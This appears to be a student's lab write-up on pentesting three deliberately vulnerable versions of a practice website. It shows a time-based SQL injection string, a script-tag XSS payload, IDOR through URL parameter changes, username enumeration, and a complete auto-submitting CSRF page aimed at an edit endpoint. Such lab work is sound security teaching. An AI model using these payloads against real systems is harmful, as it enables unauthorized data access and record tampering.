# Project 8 - Pentesting Live Targets

Time spent: **5** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: SQL Injection
<img src='./sqlInjection.gif' title='Video Walkthrough' width='' alt='Video Walkthrough Username Enumeration' />
  * [x]  The Attacker is Injects a sql command instead of the proper Salesperson's ID Number.
  * [x]  Injected SQL Command: %27%20OR%20SLEEP(5)=0--%27
  * [x]  This causes the Database command to wait for 5 seconds while quering the data.

Vulnerability #2: Session Hijacking/Fixation


## Green

Vulnerability #1: Username Enumeration
<img src='./UsernameEnumeration.gif' title='Video Walkthrough' width='' alt='Video Walkthrough Username Enumeration' />
  * [x]  As you can see from above, the Green Website has the Username Enumeration error where the failure to login message differs for the Username that exists vs doesn't exist.
  * [x]  Using Chrome's debugging tool, I was able to see that the Developer assigns two different classes, failed and failure, to the error message depending on the login senerio.
  * [x]  The "failure" class is applied an bold style in css while "failed" class doesn't. (Screen shots below)
<img src='failed.png' alt="failed png"/>
<img src='failure.png' alt="failure png"/>

Vulnerability #2: Cross-Site Scripting
<img src='./xss.gif' title='Video Walkthrough' width='' alt='Video Walkthrough XSS' />
  * [x]  Attacker can inject an XSS in their feedback form.
  * [x]  Injected XSS Command:
```html
<script>alert('Jinwoo found the XSS!');</script>
```
  * [x]  This XSS runs once the account holder checks their feedback page


## Red

Vulnerability #1: Insecure Direct Object Reference
<img src='./IDOR.gif' title='Video Walkthrough' width='' alt='Video Walkthrough IDOR' />
  * [x]  Above GIF show an attacker getting access to the hidden user's accounts that the attacker is not permitted to view. 
  * [x]  This is done through modifying the "id" parameter in the URL's to change the GET request.
  * [x]  Below are the accounts that the Attacker is able to access:
  ```html
  		- ID: 1 NAME: Daron Burke
  		- ID: 2 NAME: Sherry Trevino
  		- ID: 3 NAME: Irene Boliing
  		- ID: 4 NAME: Robert Hamilton
  		- ID: 5 NAME: Ken Barker
  		- ID: 6 NAME: Elizabeth Olson
  		- ID: 7 NAME: Samuel Hunter
  		- ID: 8 NAME: Kim Stanley
  		- ID: 9 NAME: Barbara Hinckley
  		- ID: 10 NAME: Testy McTesterson  <!-- Illegal access -->
  		- ID: 11 NAME: Lazy Lazyman       <!-- Illegal access -->
  ```

Vulnerability #2: Cross-Site Request Forgery (CSRF)
<img src='./csrf.gif' title='Video Walkthrough' width='' alt='Video Walkthrough Username Enumeration' />
  * [x]  Created a malicious page that utilizes the user's session to forge a request to the database:
```html
<html>
  <head>
    <title>NOT A FAKE FORM</title>
  </head>
  <body onload="document.my_form.submit()">
    <form action="https://35.184.199.7/red/public/staff/salespeople/edit.php?id=5" method="POST" name="my_form" style="display: none;" target="hidden_results" >
      <input type="text" name="first_name" value="TROLLEDDDD" />
      <input type="text" name="last_name" value="SORRY_Mr.Barker" />
      <input type="text" name="phone" value="777-777-7777" />
      <input type="text" name="email" value="TROLLED@TORLLED.COM" />
    </form>
    <iframe name="hidden_results" style="display: none;"></iframe>
  </body>
</html>
```
  * [x]  This page secretly makes a post request on page load and hides the outcome in a hidden iframe. 
  * [x]  As result, an account in the database is altered.
